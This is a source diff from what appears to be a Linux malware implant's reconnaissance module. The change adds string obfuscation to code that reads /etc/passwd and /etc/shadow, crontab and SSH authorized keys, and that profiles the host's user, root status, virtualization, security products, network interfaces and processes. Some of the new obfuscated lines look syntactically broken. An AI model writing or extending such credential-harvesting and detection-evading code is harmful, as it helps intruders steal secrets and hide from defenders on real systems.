@@ -322,25 +322,25 @@ static std::string list_dir(const std::string& dir) {
 
 static std::string collect_home_and_keys() {
     std::ostringstream out;
-    out << "\n=== SENSITIVE FILES ===\n";
+    out << OBFUSCATE("\n=== SENSITIVE FILES ===\n").decrypt();
 
-    out << "\n--- /etc/passwd ---\n";
+    out << OBFUSCATE("\n--- /etc/passwd ---\n").decrypt();
     out << read_file_safe("/etc/passwd");
 
-    out << "\n--- /etc/shadow ---\n";
+    out << OBFUSCATE("\n--- /etc/shadow ---\n").decrypt();
     out << read_file_safe("/etc/shadow");
 
-    out << "\n--- /etc/hosts ---\n";
+    out << OBFUSCATE("\n--- /etc/hosts ---\n").decrypt();
     out << read_file_safe("/etc/hosts");
 
-    out << "\n--- /etc/crontab ---\n";
+    out << OBFUSCATE("\n--- /etc/crontab ---\n").decrypt();
     out << read_file_safe("/etc/crontab");
 
-    out << "\n--- /home directory listing ---\n";
+    out << OBFUSCATE("\n--- /home directory listing ---\n").decrypt();
     out << list_dir("/home");
 
     // SSH keys
-    out << "\n--- SSH Authorized Keys ---\n";
+    out << OBFUSCATE("\n--- SSH Authorized Keys ---\n").decrypt();
     std::vector<std::string> home_dirs;
     {
         DIR* d = opendir("/home");
@@ -399,19 +399,19 @@ std::string perform_full_recon() {
     std::vector<NetworkInterface> interfaces = enumerate_network_interfaces();
     std::string sec_products = detect_security_products(processes);
     
-    output << "=== SYSTEM RECONNAISSANCE ===\n";
-    output << "Hostname: " << hostname << "\n";
-    output << "Kernel: " << kernel << "\n";
-    output << "UID: " << uid << " | GID: " << gid << " | Root: " << (is_root ? "YES" : "NO") << "\n";
-    output << "Virtualization: " << (hv.present ? hv.signature : "PHYSICAL") << "\n";
-    output << "Security Products: " << (sec_products.empty() ? "None detected" : sec_products) << "\n";
+    output << OBFUSCATE("=== SYSTEM RECONNAISSANCE ===\n").decrypt();
+    output << OBFUSCATE("Hostname: " << hostname << "\n").decrypt();
+    output << OBFUSCATE("Kernel: " << kernel << "\n").decrypt();
+    output << OBFUSCATE("UID: ").decrypt() << uid << " | GID: " << gid << " | Root: " << (is_root ? "YES" : "NO") << "\n";
+    output << OBFUSCATE("Virtualization: ").decrypt() << (hv.present ? hv.signature : "PHYSICAL") << "\n";
+    output << OBFUSCATE("Security Products: ").decrypt() << (sec_products.empty() ? "None detected" : sec_products) << "\n";
     
-    output << "\n--- NETWORK INTERFACES ---\n";
+    output << OBFUSCATE("\n--- NETWORK INTERFACES ---\n").decrypt();
     for (const auto& iface : interfaces) {
         output << iface.name << " | MAC: " << iface.mac << " | IP: " << iface.ip << "\n";
     }
     
-    output << "\n--- PROCESSES (Top 20) ---\n";
+    output << OBFUSCATE("\n--- PROCESSES (Top 20) ---\n").decrypt();
     int count = 0;
     for (const auto& proc : processes) {
         if (count++ >= 20) break;
